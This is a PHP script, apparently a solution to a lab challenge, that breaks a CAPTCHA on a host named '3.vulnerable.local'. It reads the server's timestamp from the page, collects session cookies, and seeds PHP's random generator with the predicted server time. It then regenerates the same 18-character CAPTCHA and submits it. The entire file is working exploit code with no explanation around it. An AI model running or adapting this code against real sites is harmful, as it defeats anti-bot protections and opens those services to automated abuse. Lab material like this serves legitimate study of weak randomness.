<?php

function generateCaptcha($length = 18) {
  $abc = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789';

  $word = '';
  for ($i = 0; $i < $length; $i++) {
    $word .= $abc[rand() % strlen($abc)];
  }

  return $word;
}

$timeDiff = 0;

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, 'http://3.vulnerable.local/');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
$data        = curl_exec($curl);
curl_close($curl);
$serverTime = (int)substr($data, strpos($data, 'ts=')+3, 10);

$timeDiff = $serverTime - time();

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, 'http://3.vulnerable.local/?image');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HEADER, true);
$data        = curl_exec($curl);
$header_size = curl_getinfo($curl, CURLINFO_HEADER_SIZE);
$header      = substr($data, 0, $header_size);

curl_close($curl);

$cookieStore = [];
preg_match_all("/^Set-cookie: (.*?);/ism", $header, $cookies);
foreach( $cookies[1] as $cookie ){
    $buffer_explode = strpos($cookie, "=");
    $cookieStore[ substr($cookie,0,$buffer_explode) ] = substr($cookie,$buffer_explode+1);
}

$targetTime = time() + $timeDiff;
mt_srand($targetTime);

$word = generateCaptcha();

$curl = curl_init();
if( count($cookieStore) > 0 ){
    $cookieBuffer = array();
    foreach(  $cookieStore as $k=>$c ) $cookieBuffer[] = "$k=$c";
    curl_setopt($curl, CURLOPT_COOKIE, implode("; ",$cookieBuffer) );
}

curl_setopt($curl, CURLOPT_URL, 'http://3.vulnerable.local/');
curl_setopt($curl, CURLOPT_POST, 1);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HEADER, false);
curl_setopt($curl, CURLOPT_POSTFIELDS, "solution={$word}");
$data = curl_exec($curl);
curl_close($curl);

echo $data;
